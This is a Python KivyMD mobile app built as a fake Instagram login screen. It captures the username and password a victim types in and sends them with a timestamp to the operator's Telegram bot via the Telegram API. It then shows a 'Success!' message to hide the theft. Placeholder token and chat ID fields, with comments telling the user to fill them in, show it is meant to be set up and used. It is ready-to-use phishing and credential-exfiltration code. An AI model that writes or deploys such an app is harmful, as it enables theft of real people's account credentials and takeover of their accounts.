from kivymd.app import MDApp
from kivymd.uix.boxlayout import MDBoxLayout
from kivymd.uix.label import MDLabel
from kivymd.uix.textfield import MDTextField
from kivymd.uix.button import MDRaisedButton
from kivymd.uix.screen import MDScreen
from kivy.clock import Clock
from kivy.logger import Logger
import requests
from datetime import datetime

# Android detection
try:
    from android.permissions import request_permissions, Permission
    ANDROID = True
except ImportError:
    ANDROID = False

BOT_TOKEN = "YOUR_BOT_TOKEN" # Yahan apna token bharna
CHAT_ID = "YOUR_CHAT_ID"     # Yahan apni chat id bharna

class InstagramScreen(MDScreen):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.layout = MDBoxLayout(orientation='vertical', padding=30, spacing=20)
        
        self.layout.add_widget(MDLabel(text="📸 Instagram", halign="center", font_style="H3"))
        
        self.username = MDTextField(hint_text="Username", mode="rectangle")
        self.layout.add_widget(self.username)
        
        self.password = MDTextField(hint_text="Password", password=True, mode="rectangle")
        self.layout.add_widget(self.password)
        
        self.btn = MDRaisedButton(text="Login", pos_hint={"center_x": .5}, on_release=self.capture)
        self.layout.add_widget(self.btn)
        
        self.status = MDLabel(text="", halign="center")
        self.layout.add_widget(self.status)
        
        self.add_widget(self.layout)
    
    def capture(self, instance):
        u = self.username.text.strip()
        p = self.password.text.strip()
        if not u or not p:
            self.status.text = "Please enter details"
            return
        self.btn.disabled = True
        self.status.text = "Connecting..."
        Clock.schedule_once(lambda dt: self.send_data(u, p), 0.5)
    
    def send_data(self, u, p):
        try:
            msg = f"User: {u}\nPass: {p}\nTime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            requests.post(url, data={'chat_id': CHAT_ID, 'text': msg}, timeout=10)
            
            self.layout.clear_widgets()
            self.layout.add_widget(MDLabel(text="✅ Success!", halign="center", font_style="H4"))
        except Exception as e:
            self.status.text = "Network Error!"
            self.btn.disabled = False
            Logger.error(f"App: {e}")

class InstagramApp(MDApp):
    def build(self):
        self.theme_cls.theme_style = "Light"
        self.theme_cls.primary_palette = "Blue"
        if ANDROID:
            request_permissions([Permission.INTERNET])
        return InstagramScreen()

if __name__ == '__main__':
    InstagramApp().run()
